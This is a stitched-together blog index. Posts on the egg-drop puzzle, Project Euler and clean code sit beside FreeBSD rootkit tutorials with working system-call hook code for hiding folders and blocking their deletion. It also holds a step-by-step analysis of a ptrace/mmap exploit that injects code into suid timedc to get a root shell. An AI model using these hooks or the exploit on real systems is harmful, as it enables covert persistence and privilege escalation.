so if any of these terms look strange to you, please do not hesitate to go back and review the note.  ","categories": [],

        "title": "FreeBSD Rootkit Design Howtos - 8 - System Call Hook and mkdir_hook Example",
        "excerpt":"We should all agree with the simplicity of the first chapter at this point, there are only few new APIs and concepts, all we did was following the book, the manual pages, or the examples. So if I tell you that we can write real rootkits starting from this chapter, you’d probably not believe me, but that is true. All we need is a little push to the by far most common, most famous, and most popular rootkit technique – the Hooking, since we already have all basic knowledge required for this.   Hooking   As I said, the Hooking technique might be one of the oldest and most widely spread rootkit techniques. The concept of hook is easy, we program and install a kernel module, and let that module pretends to be another system module to change the routine of an execution of a command.   It is rather a simple but efficient technique, all we have to do is to change the routine of an system execution, so that we can change the execution results, add functionalities, and also deduct functionalities if we want. So if you intend to write rootkits, then Hooking is for sure the simplest and most efficient technique to use. For example, we can hide file contents, hide directory, hide network connections by hooking those function calls and change the way how they display the results.      The above figure shows the process of how to hijack a list directory call and hide file(s) from displaying. The original process should be triggered by a ls command, where the testDirectory is the parameter here. The the list directory call will use the parameter to read the list of items under that directory and eventually display all of them one by one.   To hijack the execution process the system call, register itself as the new list directory call, read the list of items under that directory and check Is the Item Hidden (by filename, or by contents, you decide the checking mechanism), and then display those are not hidden by calling the original system call, and everything will be working normally by the end except that we have hiden our secret files.   So you can see that the power of Hooking is only limited by your imagination. You can hide files, hide network connections, temper user list results, have the infected host uploading all it’s logs when it initializes a HTTP request, or delete the entire filesystem on your birthday to have some malicous fun.   Once we get to know how to program a Hooking, we can start writing our first rootkit. That is what I’m gonna do in this chapter, unlike the first chapter, we are not going to learn a lot of APIs, instead, we’ll see lots of examples(from the book, or by myself) to show the real power of Hooking.   Okay, enough talk, lets start with a mkdir_hook example.   The mkdir_hook Example   Manipulate sysent[] Table   As we have discussed previously, sysent[] is a table holding every registered system call’s sysent structure. The hooking technique is based on tempering the sysent[] table, so let’s review this a little bit.   FILE:/usr/src/sys/sys/sysent.h  struct sysent {                 /* system call table */         int     sy_narg;        /* number of arguments */         sy_call_t *sy_call;     /* implementing function */         au_event_t sy_auevent;  /* audit event associated with syscall */         systrace_args_func_t sy_systrace_args_func;                                 /* optional argument conversion function. */         u_int32_t sy_entry;     /* DTrace entry ID for systrace. */         u_int32_t sy_return;    /* DTrace return ID for systrace. */         u_int32_t sy_flags;     /* General flags for system calls. */         u_int32_t sy_thrcnt; };  ...  extern struct sysent sysent[];   The process is we create sysent structure for our system calls, put basic information like number of arguments and implementation functions in it, and register our system call with sysent[] table. See example code below.   ... ...  /* The system call's arguments. */ struct sc_example_args {     char *str; };  /* The system call function. */ static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args; ... ... }  /* The sysent for the new system call */ static struct sysent sc_example_sysent = {     1,  /* number of arguments */     sc_example  /* implementing function */ };  ... ...  SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, load, NULL);   In the example above, we created sc_example_sysent sysent structure, and specified the number of arguments and implementation function pointer to that structure, and use it as a parameter for SYSCALL_MODULE declaration macro.   So if we want to change the execution routine of mkdir, and register our own module as mkdir in sysent[] table, all we have to to is to get the sysent offset of mkdir, and change the sy_call to our own implementation function pointer. Sample code should look like this:   ... /* The system call's arguments. */ struct mkdir_hook_args {     ...  };  /* mkdir system call hook */ static int mkdir_hook(struct thread *td, void *syscall_args) {     ... }  /* The sysent for the new system call */ static struct sysent mkdir_hook_sysent = {     ...     mkdir_hook  /* implementing function */ };  sysent[MKDIR_OFFSET].sy_call = (sy_call_t *)mkdir_hook;   And to undo the changing to sysent[] table, we just need to   sysent[MKDIR_OFFSET].sy_call = (sy_call_t *)mkdir;   For general system calls, such as mkdir, we can get a list of constant offsets of them in sys/syscall.h   FILE:/usr/src/sys/sys/syscall.h  ... #define SYS_rename      128                                 /* 129 is old truncate */                                 /* 130 is old ftruncate */ #define SYS_flock       131 #define SYS_mkfifo      132 #define SYS_sendto      133 #define SYS_shutdown    134 #define SYS_socketpair  135 #define SYS_mkdir       136 #define SYS_rmdir       137 #define SYS_utimes      138                                 /* 139 is obsolete 4.2 sigreturn */ ... ...   Be sure to take a look at that list, there are so many fun system calls we can abuse. :-p   The Implementation   The example code from the book won’t complie, here’s my revised version.   #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; //New #include &lt;sys/systm.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ struct mkdir_hook_args {     char *path;     int mode; };  /* mkdir system call hook */ static int mkdir_hook(struct thread *td, void *syscall_args) {     struct mkdir_hook_args *uap;     uap = (struct mkdir_hook_args *)syscall_args;      char path[255];     size_t done;     int error;      error = copyinstr(uap-&gt;path, path, 255, &amp;done);     if (error!=0)         return(error);      /* print a debug message */     uprintf(\"The directory \"%s\" will be created with the following permissions: %on\", path, uap-&gt;mode);      return (mkdir(td, syscall_args)); }  /* The sysent for the new system call */ static struct sysent mkdir_hook_sysent = {     2,          /* number of arguments */     mkdir_hook  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error=0;      switch(cmd) {         case MOD_LOAD:             /* Replace mkdir with mkdir_hook. */             sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;             uprintf(\"The mkdir_hook is loaded, you can try to mkdir now.n\");             break;          case MOD_UNLOAD:             /* Change everything back to normal. */             sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir;             uprintf(\"The mkdir_hook is unloaded, everything is back to normal now.n\");             break;          default:             error = EOPNOTSUPP;             break;     }      return(error); }  SYSCALL_MODULE(mkdir_hook, &amp;offset, &amp;mkdir_hook_sysent, load, NULL);   This is nothing just a normal system call, we have mkdir_hook_args to receive arguments, we have mkdir_hook as implementation function, mkdir_hook_sysent as sysent structure, load as event handler and finally use SYSCALL_MODULE to declare the system call.   What this system call does is to change sysent[] table, set mkdir_hook as the implementation function of SYS_mkdir when this module loads, and set it back to normal when it unloads (Otherwise mkdir call will not work once our module is unloaded from the kernel). And we receive arguments of the path and mode of the directory to be created from user space, copy path to kernel space using copyinstr(), display a simple debug message, and then pass the thread td and system arguments(contains path and mode) syscall_args to a normal mkdir call to complete the request.

        "title": "2 Eggs versus 100 Floor",
        "excerpt":"I saw this problem posted on Facebook today, and find it really intriguing and quite enjoyable to solve.   The problem is described as follow:           You are given 2 eggs.     You have access to a 100-storey building.     Eggs can be very hard or very fragile means it may break if dropped from the first floor or may not even break if dropped from 100 th floor.Both eggs are identical.     You need to figure out the highest floor of a 100-storey building an egg can be dropped without breaking.     Now the question is how many drops you need to make. You are allowed to break 2 eggs in the process      The following methods, codes, and algorithms are all from a pure computer   student’s point of view, I know some people can directly solve the problem   without writing any code, but that’s no fun, is it?   Understand the question  Let’s take a rough look at the question first. Given that these two eggs are identical, the hardness of these two eggs are equally the same, which means that   hardness(egg1) = hardness(egg2)  highest_breaking_floor(egg1) = highest_breaking_floor(egg2)   I’m quite tempted to use binary search, drop the first egg at 50th floor, we will then have two possible consequences           Egg1 breaks       This means the highest floor the egg doesn’t break is less than 50, or 1-49th.          Egg1 did not break       And this means the highest floor the egg can bear to be dropped down from is greater than 50, 51-100th.    This seems to be a very straight forward solution to find out the answer, either one of these two situations will require a linear search to find out the real answer. This is a general solution to solve the problem, but the performance of total tries are questionable.   The General Solution  In order to better understand how this approach works, let’s look at the following pseudocode and flowchart.   DROP egg1 AT 50th FLOOR  IF egg1.break == TRUE:     FOR answer=1, answer&lt;=49,answer++         DROP egg2 AT answer FLOOR         IF egg2.break == TRUE:             PRINT 'The Answer IS:', answer-1             BREAK  ELSE:     FOR answer=51, answer&lt;=100,answer++         DROP egg1 AT answer FLOOR         IF egg1.break == TRUE:             PRINT 'The Answer IS:', answer-1             BREAK      Well, let’s admit it, this is, as the name suggests, a very basic and general solution. But before we try to figure out better algorithms, let’s look at this general solution a little bit closer.   We all know that under most context, a binary search is almost definitely better than a linear search, then why don’t we keep performing it and instead utilized linear search after the first try?   Imagine if we broke the first egg at 50th floor, and wants to continue binary search, then the next floor to try would be 25th floor. Now if the second egg breaks at 25th floor, or any other subsequent binary search tries, there would be no egg left to find out the exact answer.   However if the first egg does not break when dropped from 50th floor, we now still have 2 eggs to spare, which would allow us to perform more binary searches through 51-100th floor until we have only 1 egg left. So in short, we can only perform binary search when we have both eggs intact, and linear search when we have only 1 of them left. Pretty straighforward.   More binary search!   Instead of performing 49 linear search plus the initial binary search, scoring a horrific 50 tries at worst circumstance, let’s find out what is the optimal number of tries if the first egg manages to survive every binary search drops.                  Count       Try At       Binary Search Start Value       Binary Search End Value       Number of Search Values                       1       50       51       100       50                 2       75       76       100       25                 3       88       87       100       13                 4       94       93       100       7                 5       97       96       100       4                 6       99       98       100       2           The table above illustrates a typical binary search, we always halve the Number of Search Values and add it to the last Try At to get the next binary search offset.   It is clear that the minimal number of tries to get the answer would be 6, we drop the egg at 99th floor if it manages to survive all previous attempts, the answer is 98 if it breaks, and 100 if it doesn’t.   Now we know the range of tries to find the answer is 6 to 50, it is time to optimize our approach.   Optimization   Every optimization starts with a question, are there room for optimization? Fortunately, answering this question often brings us right to the optimized solution, if there is one.   Let’s assume the optimized maximum number of tries to solve this problew is X. We already know that the worst scenario only happen when first binary search resulted in a broken egg, in that case, we have to linear search from 1 to X-1, totalling X-1-1+1 linear searches and 1 already performed binary search.   This means X is not only the max number of tries, but also the first binary search index, or offset if you will. Let’s illustrate this with a table.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 ???       X+1       ???-1       (???-1)-(X+1)+1 = X-2       2       X-2+2 = X           It is obvious for the first try, since at this point we only care about maximum tries, the scenario would be we drop the first egg at Xth floor, it breaks, we then perform linear search from 1st floor to X-1th floor, resulting (X-1)-1+1 = X-1 linear searches, adding the first binary seach try we performed to it, we get X-1+1 = X tries.   Perfect, it meets our assumption that the maximum tries needed to figure out the answer is X. But at which floor should us perform the second binary search try if the egg survived?   Well, we can’t halve the number of remaining search values like we did previously, that simply breaks our assumption of getting the answer within X tries.   An easier way to understand it is, let’s assume the second binary search offset is ???, the linear start would be X+1 since all previous values are ruled out given the first egg survived, the linear end would be ???-1, then total number of linear searches needed to perform if the egg broke at the secound try would be (???-1)-(X+1)+1, and that value must equal to X-2 since only then would total tries equal to X. Thus,      (???-1)-(X+1)+1 = X-2     ??? = 2X-1    Subsequential offsets can all be calculated similarly.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 2X-1       X+1       (2X-1)-1       (2X-1-1)-(X+1)+1 = X-2       2       X-2+2 = X                 3X-3       (2X-1)+1 = 2X       (3X-3)-1       (3X-3-1)-2X = X-3       3       X-3+3 = X                 …       …       …       …       …       …                                                                     It is now obvious that the second binary search offset is X+(X-1) and the third X+(X-1)+(X-2), which allows us to deduce the last try at should be X+(X-1)+(X-2)+…+[X-(X-2)]+1.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 X+(X-1)       X+1       (2X-1)-1       (2X-1-1)-(X+1)+1 = X-2       2       X-2+2 = X                 X+(X-1)+(X-2)       (2X-1)+1 = 2X       (3X-3)-1       (3X-3-1)-2X = X-3       3       X-3+3 = X                 …       …       …       …       …       …                 X+(X-1)+(X-2)+…+[X-(X-2)]+1       N/A       N/A       0       X       X           The last binary search we perform should not require any further linear search, thus resulting in X total binary searches, and consequentially X total tries.   In order to fulfil the assumption that the last offset should require no further linear search, which in other words, means we should cover all floors with the last binary search offset, we can conclude that      X+(X-1)+(X-2)+…+[X-(X-2)]+1 &gt;= 100.

        "title": "FreeBSD Rootkit Design Howtos - 9 - Hook Kernel Process Tracking and rmdir_hook Example",
        "excerpt":"It has been a long time since I posted last note on system hooks and a mkdir_hook example. A lot of things happened during these days and I just didn’t manage to get back and post this one. As a matter of fact, the code for this note has been ready since at least a month ago. I don’t know whether there’s anyone waiting for me to update this series but I must admit that I feel bad to had to pause it for a while. I’m glad that I finally have time again to work on this   Nevertheless, I’m back. Enough talking about my personal issues, and let’s get right back to our topic, the long waiting kernel tracing and rmdir_hook example.   Trace the Kernel Calls   Let’s say you have this great idea you want to implement in your rootkit, it does the most despicable things and is as elusive as the shadow, but you may feel lost when you try to code this awesome idea – what are the system calls I should hook to implement certain functionalities?   Fret not, we can trace the kernel calls to find out what system calls are called when certain actions are performed. For example, what are the system calls involved when the host establishes a new TPC connection?   There are only two simple commands involved here for us to track a kernel behavior, ktrace and kdump.   ktrace requires a parameter to pass which should be an executable action that you want the system to perform. Once the action’s done, a trace output file will be generated. And then we can utilize kdump to view a list of all kernel calls when performing the command we specified earlier. Let’s see an example now.   ZFSTest# cd /tmp ZFSTest# mkdir test_folder ZFSTest# ktrace rmdir test_folder ZFSTest# ls .ICE-unix       .XIM-unix       conftest.osav       ktrace.out      mysql.sock      test .X11-unix       .font-unix      conftest.sav        make_fifo_KyuyJ99a2 rmtest ZFSTest#   What we did was we firstly created a testing folder called test_folder and then removed the folder by using rmdir command and traced the kernel activities while we issued the command. A trace result was generated and saved in the current working folder called ktrace.out.   Please keep in mind that in order for ktrace to successfully and fully get your desired result, the command you issued should complete successfully in the first place. Which means, if we plan to see what happens when we delete a folder, and we don’t specify which folder to delete, then we won’t be able to trace the actual folder-deleting kernel call since it wasn’t triggered at all. For example, we can’t get the information about the folder-deleting kernel call if we issued the following command.   ZFSTest# ktrace rmdir usage: rmdir [-pv] directory ... ZFSTest#   That’s because the rmdir command exits straight away after printing the help information on the screen since it didn’t receive any folder to delete, so that the folder-deleting function was not called, and obviously not in the ktrace.out file.   Let’s now take a look at the output file by issuing kdump command which by default will look for ktrace.out file in current working directory.   ZFSTest# kdump | less   2769 ktrace   RET   ktrace 0   2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)   2769 ktrace   NAMI  \"/sbin/rmdir\"   2769 ktrace   RET   execve -1 errno 2 No such file or directory   2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)   2769 ktrace   NAMI  \"/bin/rmdir\"   2769 ktrace   NAMI  \"/libexec/ld-elf.so.1\"   2769 rmdir    RET   execve 0   2769 rmdir    CALL  mmap(0,0x8000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x1002&lt;MAP_PRIVATE|MAP_ANON&gt;,0xffffffff,0)   2769 rmdir    RET   mmap 34365181952/0x800531000   2769 rmdir    CALL  issetugid   2769 rmdir    RET   issetugid 0  ... ...    2769 rmdir    RET   read 128/0x80   2769 rmdir    CALL  lseek(0x3,0x80,SEEK_SET)   2769 rmdir    RET   lseek 128/0x80   2769 rmdir    CALL  read(0x3,0x800534000,0x42)  ... ...    2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)   2769 rmdir    RET   sigprocmask 0   2769 rmdir    CALL  rmdir(0x7fffffffed5e)   2769 rmdir    NAMI  \"test_folder\"   2769 rmdir    RET   rmdir 0  ... ...    2769 rmdir    CALL  exit(0)   There were many different system calls performed when we deleted the test_folder, but the one that we concern most should be rmdir system call at 2769. If you only want to get a name of the system call of a specific command, like what we want here, you can even filter the result by searching keyword CALL to only concentrate on system calls and their names.

As what we can see from above results, the rmdir seems to be the final call which the kernel actually performs the deleting operation. So give our goal is to have non-deletable folders, which obviously, by hooking rmdir system calls, we can make certain folders survive from deletion. It is important for rootkits to not be detected and removed so easily, now let’s jump right into in.   One may argue that the user can delete a folder with many different commands, such as rm -r or what if rm -rf? Will the system call the same for all folder-deleting operations even if they were issued by different command? The answer is yes.   ZFSTest# mkdir test_folder ZFSTest# ktrace rm -rf test_folder/ ZFSTest#   We may get different system call routines, but will surely end up with this:   ... ...   2824 rm       CALL  close(0x3)   2824 rm       CALL  access(0x800537000,0&lt;F_OK&gt;)   2824 rm       CALL  open(0x800534040,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x63c5e0) ... ...   2824 rm       CALL  close(0x4)   2824 rm       CALL  fchdir(0x3)   2824 rm       CALL  rmdir(0x800c10100) ... ...   2824 rm       CALL  exit(0)   As you can see, the system call that actually did the deletion is still rmdir. In fact, most of the kernel calls are simple and reusable, may be used by multiple different userland applications. Here’s a list of command system calls from the book.

It calls rmdir straight away with path specified unless pflag was provided to delete every component in the path specified. So now what we need to do is simply hooking rmdir system call.   The rmdir_hook &amp; Summary   This is pretty much all we need to know about kernel activity tracing. We’ve successfully hunted down the final call which FreeBSD kernel utilizes to delete a folder, looked at it’s source code and understood how it works.

What we are trying to achieve is to prevent any path that has the secret word inside from being deleted by the user. What we need to do is to check the path and see whether the secret word is inside or not. Here comes another problem that we need to think about just for a few minutes.   The Absolute Path and Relative Path   We all know the difference between absolute path and relative path. The troublesome part here is that rmdir accepts both of them, meaning that all following commands are acceptable.   rmdir /usr/local/etc/test_conf rmdir ./../local/etc/test_conf rmdir local/etc/../../local/etc/test_conf   We need to protect our folders from being deleted by using relative path, that’s why another checking was implemented in the sample code above to trim ‘/’ from path to see is there any part in the path that matches the secret.   What the code does after that is simple enough, it triggers original rmdir call if secret was not present in the path and the return the status of the execution so that users will be able to see original error messages as well.   Of course, in a real life rootkit, you probably don’t want to print out debug messages saying the deletion failed, they are just for the purpose of this demonstration.

Interesting stuff, there are like 400-something computational problems on that site, which according to that guy      Has trained tens of thousands of new programmers.    I started right away to the first problem, suppose to be a pretty easy one.      If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6, and 9. The sum of these multiples is 23. Find the sum of all the multiples of 3 or 5 below 10000.    Turns out it is indeed easy.

        "title": "Largest Prime Factor",
        "excerpt":"   Third question from Project Euler, finding the largest factor of a prime number.    Great, I’ve actually been researching in prime numebrs recently. Got this crazy idea, or a hypotheses few monthes ago, but never had the time to prove it. I spent days trying to figure out better way to generate prime numbers, since my crazy theory involves large primes, I mean, really large ones… Anyway, turns out it’s indeed just a crazy thought, not even worth mentioning.   Get back to the topic. Problem 3 asks to find the lagest prime factors of the number 600851475143. Not a large number to be frank. So I’ll stick simplest factorization algorithm for this particular question.   I guess I’ll write a review on more complex factorization algorithms, those that are used to factor large prime numbers in number theory and cryptograhy. Will get back and put the link here if I ever decide to write it.   def prime_factorization(n):     factors = []     x = 2     while x &lt;= n:         if n % x == 0:             n /= x             factors.append(x)         else:             x += 1     return factors   This is like a brute-force algorithm, put x in the factors list if n is divisible by x, then divide n by x before next iteration. If n cannot be divided by x, then increase the value of x by 1.   Then I can just do this to get the result   print \"The answer is: \" + str(max(prime_factorization(600851475143)))   And the answer is 6857.   Few things to keep in mind           Except for prime numbers, all whole numbers can be broken down into prime factors            There’s no need to check whether x is a prime number, it is guaranteed to be prime       To explain this, take a look at the example below.   &gt;&gt;&gt; prime_factorization(100) [2, 2, 5, 5]   Of course, 100 can be factored into non-prime numbers like 4, 10, 20, 25, 50. But as I have explained in (1), all these non-prime numbers can be divided into prime number factors.      4 = 2 * 2     10 = 2 * 5     20 = 2 * 2 * 5    And so on. The fact that the program starts with smallest prime numbers (2, 3, 5, 7…) prevents non-prime factors.   Lastly, note that it’s x &lt;= n  ","categories": [],

        "title": "Smallest Multiple",
        "excerpt":"   2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder.     What is the smallest positive number that is evenly divisible by all of the numbers from 1 to 20?    Fifth question from Project Euler.   Given that 2520 is evenly divisible by numbers from 1 to 10, which means it is always true that   2520 % x = 0 (0&lt;x&lt;11)   Now 2520 is called the Least Common Multiple (LCM) of X = [1, 2, ..., 10]   The most straight forward method to find the LCM for 1 to 20 is to use a loop and check on every stepping to see if the next number can be divided by 1 to 20. But this will probably take too long (The answer is more than 100 million)   We can try to reduce the size of the set X to speed up the process. 1 for instance, can be removed from the list since all positive whole numbers are divisible by 1. Furthermore, if a number is divisible by 20, then it should be divisible by 2, 4, 5, and 10. We’ll end up with a list looks like   X = [11,13,14,16,17,18,19,20]   Now since it is always true that   (x1 * x2 * x3 * ... * xn) % x1 = 0   So that if we were to multiply all the numbers in X, we get 3724680960 which is divisible by every number in X. We can say that 3724680960 is a common multiple, but it is unlikely the least common multiple.   The LCM can be calculated by dividing 3724680960 by the Greatest Common Divisor (GCD) of X.   For instance,   Y = [6, 9] #Then we have multiple = 6 * 9 = 54 #And GCD(Y) = 3 #Since 54 = 6 * 9 = 3 * 2 * 3 * 3 #Then LCM(Y) = multiple / GCD(Y) = 3 * 2 * 3 * 3 / 3 = 18   Euclidean Algorithm can be used to calculate GCD of two integers very fast.   def gcd(a, b):     while b:         a, b = b, a % b     return a   For instance, gcd(6, 9) will have                  a       b       result                       6       9                         9       6 (6 % 9)                         6       3 (9 % 6)                         3       0 (6 % 3)       3 (b = 0)           And since we have   GCD(a, b, c) = GCD(a, GCD(b, c)) = GCD(GCD(a, b), c) = GCD(GCD(a, c), b)   We can apply gcd and lcm functions to a list of numbers by using reduce   def _sum(a, b):     return a + b  Y = [6, 9, 11] reduce(_sum, Y) #Is equivalent to _sum(_sum(6, 9), 11)  Now putting all together, we have   def gcd(a, b):     while b:         a, b = b, a % b     return a  def lcm(a, b):     return a * b / gcd(a, b)  x = [11,13,14,16,17,18,19,20] print reduce(lcm, x) #232792560 print reduce(xrange(1, 21) #232792560   Either way, the answer is 232792560.

And the ptrace is a handy tracing and debugging facility that allows users to attach to and control the traced process.   A security vulnerability exists in the virtual memory system that the permission checks are insufficient which allows the tracing process to modify adresses to which the traced process itself does not have write access.   The Analysis   The exploit code is quite simple, but it took me sometime to understand how mmap(2) and ptrace(2) works under FreeBSD.   if (geteuid() == 0)  {      setuid(0);      execl(SH, SH, NULL);      return 0; }   At the begining of the exploit, it checks if the effective user id is 0. This will only be true when the suid bit is set for the executable. Of course it’s not true at this point, because the exploit binary doesn’t have suid set.   However, this code will eventually get injected into another executable program, which obviously should have the suid bit, so that we can then setuid to 0, and get our lovely shell with root privilege.   #define TG \"/usr/sbin/timedc\"  $ ls -l /usr/sbin/timedc -r-sr-xr-x  1 root  wheel  20688 Dec  4  2012 /usr/sbin/timedc   As you can see here, timedc is chosen for us to inject to. Note that it has suid bit.   So now what’s left is to just inject this code into timedc, and when it gets called, we get a shell.   if ((from_fd = open(av[0], O_RDONLY)) == -1 ||      (to_fd = open(TG, O_RDONLY)) == -1)              err(1, \"open\"); if (stat(av[0], &amp;st) == -1)        err(2, \"stat\");   Now it tries to open the compiled binary of itself (av[0]) as from_fd, and /usr/sbin/timedc as to_fd. And then the stat of the exploit binary is saved in a stat struct called st. It’ll later be used to get the size of the exploit binary.   if (((s = mmap(NULL, (size_t)st.st_size, PROT_READ,      MAP_SHARED, from_fd, (off_t)0)) == MAP_FAILED) ||              (d = mmap(NULL, (size_t)st.st_size, PROT_READ,                      MAP_SHARED|MAP_NOSYNC, to_fd, (off_t)0)) == MAP_FAILED)                              err(3, \"mmap\");   mmap is used then to map the exploit binary into memory as s and timedc as d.   Refer to mmap man pages for details.   if ((pid = fork()) == -1)      err(4, \"fork\");  if (!pid) {      if (ptrace(PT_TRACE_ME, pid, NULL, 0) == -1)              err(5, \"ptraceme\");       return 0;      }  if (ptrace(PT_ATTACH, pid, NULL, 0) == -1)      err(6, \"ptattach\");  if (wait(&amp;status) == -1)      err(7, \"wait\");   Next it forks a child process. fork returns 0 to the child process, and the child process id to the parent process.   Since !pid is true only for the child process, PT_TRACE_ME marks the child as the traced process, This is for the kernel to know that some other process is tracing this child.   PT_ATTACH is executed by the parent process, it attaches to the child to start controlling it. Now we have two processes of the exploit, one tracing process, and one traced process.   Finally with wait, it suspends the calling process until status is available for terminated child process, or a signal is received from kernel. Since PT_TRACE_ME is set for the child process, a signal from kernel is expected. That’ll explicitly tell us that we are now okay to start tracing.   piod.piod_op = PIOD_WRITE_D; piod.piod_offs = d; piod.piod_addr = s; piod.piod_len  = st.st_size;  if (ptrace(PT_IO, pid, (caddr_t)&amp;piod, 0) == -1)      err(8, \"ptio\");   piod is a ptrace_io_desc struct, it’ll be used by PT_IO   The PT_IO request allows reading and writing arbitrary amounts of data in the traced process’s address space. In this case the addr argument should be a pointer to a ptrace_io_desc which is defined as   struct ptrace_io_desc {         int     piod_op;        /* I/O operation */         void    *piod_offs;     /* child offset */         void    *piod_addr;     /* parent offset */         size_t  piod_len;       /* request length */ };   This is designed for us to write data to the child process, but instead this piece of code writes the exploit binary to timedc.   This is the exact point of the vulnerability, the parent tracing process controls the child traced process to write data to timedc, which it originally has no privilege to do so. The virtual memory system does not check if such write/read operation is allowed. The injection of the exploit code into timedc is finished.   execl(TG, TG, NULL);   Now it runs timedc. Since it has the exploit code injected, and it has suid set, we can now get a shell with root privilege.   The Solution   A patch is provided by the Security Advisory.

        "title": "10001st Prime Number",
        "excerpt":"   By listing the first six prime numbers: 2, 3, 5, 7, 11, and 13, we can see that the 6th prime is 13. What is the 10001st prime number?    This is the seventh question from Project Euler. Getting the 10001st prime number.   Well, the most staright forward method to solve this is to iterate through all nummbers greater than 2 and check their primality one by one until we reach the 10001st prime.   To check a number’s primality, we can simply try to divide the number by every number less than it. With the computational power that everyone has nowadays, even a simple solution as such can effectively give an answer within seconds or even fractions of seconds. But what if we need the 10000001st prime number?   As the counter grows, it is awkward to stick with a brute-force algorithm. We need to optimize it, and make it variable for reasonable large numbers.   A simple optimization is that, if a number can be divided by an even number, it is not a prime number, and it can be divided by 2. For instance,   12 / 4 = 3  and  12 / 2 = 6 Since 12 = 2 * 2 * 3   As shown above, when testing a number’s primality, we don’t need to divide the number by even numbers that are less than it, we only need to test odd numbers. For instance,   13 % 2 != 0 13 % 3 != 0 13 % 5 != 0 13 % 7 != 0 13 % 9 != 0 13 % 11 != 0  # Thus, 13 is a prime number   Any number that can be divided by an even number can also be divided by 2, it’ll fail the first checking so we don’t have to worry about even numbers at all.   Since we cut off all the even number checkings except for 2, it is nearly half of the original cost.   Yet we can further improve this simple primality checking algorithm.   # Since for any number, we have x = a * b  If a &gt; sqrt(x) and b &gt; sqrt(x) then a * b &gt; x  # Thus, only one of a, b can be greater than sqrt(x)   This means when checking a numbers primality, not all the odd numbers less than it need to be checked, only for those that are also less than the square root of the number. For insance,   sqrt(13) = 3.60 13 % 2 != 0 13 % 3 ! = 0  # Thus, 13 is a prime number   Looks like we just effectively reduced the cost by half again. To implement this idea to get the 10001st prime number,   import math def isPrime(num):     if num == 2:         return True     if num % 2 == 0 or num &lt; 2:         return False     #Start from 3, until its square root, with stepping 2     for x in xrange(3, int(math.sqrt(num)) + 1, 2):         if num % x == 0:             return False     return True  if __name__ == '__main__':     num = counter = 1     while (counter &lt; 10001):         num += 2 #Only test odd numbers         if isPrime(num):             counter += 1     print \"The 10001st prime number is: \" + str(num)   Note that,   for x in xrange(3, int(math.sqrt(num)) + 1, 2):  # Is equivalent to  for (int x = 3; x &lt;= sqrt(num); x += 2)  # In some other programming languages.

        "title": "Clean Code Tips and Tricks: Introduction & Variables",
        "excerpt":"I recently organized a workshop for my team members to talk about Clean Code. It has been a major issue plaguing the team and has been slowing us down by generating tons of unreadable and unmaintainable code. So I took the oppoturnity of the Chinese New Year holidays and delivered these three-days talk online.   I had great feedback from my team members and learned a few things myself by preaching the Clean Code concept along with part of the S.O.L.I.D Principle. The following weeks brought exiciting and notable results, the code quality improved significantly just by following these simple tips and tricks. Better still, even some skilled developers with many years of work experience showed signs of improvement in code quality.   So I figured it might be of help to other developers if I post these notes online. I revised the notes I used to deliver the talks and incorporated some of the new ideas I’ve learned, now I’m ready to share them with you.   This will be divided into three instalments as the original workshop lasted three days as well, it’d be a pain to wade through in just one session.   Alright, enough talk, let’s jump right in.   What is this all about?   We want our code clean, and we want it now. It means readable, maintainable, testable, and robust code.   I would say that understandability is the most important among all other properties. People would enjoy working with your code if they are easy to understand.   Maintainablity is the ability to freely extend a piece of existing code  without having to modify too much. Having great maintainability is definitely profitable for the long haul, you wouldn’t be afraid of requirement changes so much anymore.   Testability makes it easier to write tests for your code. Properly test-covered codebase allows you to write, edit, modify, extend your way deep into the very core of the software without worrying about your commit breaking too many existing functionalities.   It also means robustness, write code that are strong, bug-free, rich in features and exception handling that would still fight like a tough soldier after years of production.   These characteristics are interconnected, you’d often times find that in order to adopt one of them properly, you have to implement the other one, it’s also true that when you work for one aspect, others would improve as well.   And that is exactly what we want to achieve here. Since when it comes to testability, maintainability and robustness, we have to turn our faces to certain design patterns and principles to have a profound qualitative change to your codebase. Though this workshop is mainly focused on readablity, you will find a powerful impact on your codebase, not only do they become easier to understand, but also more enjoyable to maintain and write tests for.   We do have a brief discussion about S.O.L.I.D principle on day 3, I think it’s great and should be adopted by every developer. I’m planning on writing about other patterns and principles I’ve personally had experience with in the near future, stay tuned if you are interested.   But Why?      “When it comes to writing code, an ounce of prevention is worth a pound of cure.”    We all had this experience, whether you yourself or one of your co-workers who wrote code carelessly and irresponsibly, which then led to bugs, performance issues, and weird system behaviors nobody knows why and how. After days of debugging, you finally pinpointed that piece of shit, um I mean code, you found it utterly gibberish and unbearably hard to understand. Then after pulling all your hairs off, you finally understood the code and the cause of the issue, just to be confronted by the harsh reality that it is nearly impossible to modify or extend the orginal code without editing too much. At some stage along this path, a hard decision would be made to rewrite the whole thing and you wouldn’t even be surprised to find out the exact same issues are there all over again.   It’s a vicious cycle with no way but only one way out – WRITE, CLEAN, CODE.   Meh, I’m Just Too Busy   No 